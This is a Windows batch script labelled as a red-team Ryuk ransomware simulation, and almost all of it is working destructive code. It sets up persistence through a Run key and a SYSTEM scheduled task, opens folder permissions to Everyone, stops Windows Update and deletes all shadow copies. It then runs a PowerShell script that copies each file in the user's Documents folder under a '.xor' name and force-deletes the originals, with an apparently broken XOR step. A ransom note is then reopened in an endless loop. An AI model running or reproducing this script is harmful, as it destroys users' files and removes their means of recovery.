@echo off
title [!] Ryuk Simulation - Red Team Batch
color 0C

REM ===============================
REM === INITIAL ACCESS TECHNIQUES
REM ===============================

echo [*] Checking token privileges...
whoami /priv
echo.

REM ===============================
REM === PERSISTENCE TECHNIQUES
REM ===============================

echo [*] Creating Run key for persistence...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistenceExample" /t REG_SZ /d "%~f0" /f
echo.

echo [*] Creating scheduled task...
schtasks /create /tn "RansomPersistence" /tr "%~f0" /sc onstart /ru SYSTEM /f
echo.

REM ===============================
REM === ENUMERATION & MODIFICATIONS
REM ===============================

echo [*] Enumerating drives...
wmic logicaldisk get name
echo.

echo [*] Modifying permissions on C:\TestFolder (if exists)...
icacls "C:\TestFolder" /grant Everyone:F /T /C /Q
echo.

echo [*] Listing running processes...
tasklist
echo.

REM ===============================
REM === ANTI-RECOVERY ACTIONS
REM ===============================

echo [*] Attempting to stop Windows Update service...
net stop wuauserv
echo.

echo [*] Deleting shadow copies...
vssadmin delete shadows /all /quiet
echo.

REM ===============================
REM === SIMULATED "ENCRYPTION" USING XOR
REM ===============================

echo [*] Simulating file encryption using XOR...

REM Create temp encryption script
set xorScript=%TEMP%\xor_encrypt.ps1
echo $files = Get-ChildItem -Path "%USERPROFILE%\Documents" -File -Recurse -ErrorAction SilentlyContinue > "%xorScript%"
echo foreach ($f in $files) { >> "%xorScript%"
echo     $bytes = [System.IO.File]::ReadAllBytes($f.FullName) >> "%xorScript%"
echo     $xor = $bytes ^ 0x42 >> "%xorScript%"
echo     [System.IO.File]::WriteAllBytes($f.FullName + ".xor", $xor) >> "%xorScript%"
echo     Remove-Item $f.FullName -Force >> "%xorScript%"
echo } >> "%xorScript%"

powershell -ExecutionPolicy Bypass -File "%xorScript%"
del "%xorScript%"
echo.

REM ===============================
REM === RANSOM NOTE DEPLOYMENT
REM ===============================

echo [*] Dropping and displaying ransom note...

copy /Y "%~dp0ryuk.txt" "%USERPROFILE%\Desktop\RYUK_README.txt"
start notepad.exe "%USERPROFILE%\Desktop\RYUK_README.txt"

REM Optional infinite loop to reopen ransom note (comment to disable)
:loop
timeout /t 15 >nul
start notepad.exe "%USERPROFILE%\Desktop\RYUK_README.txt"
goto loop
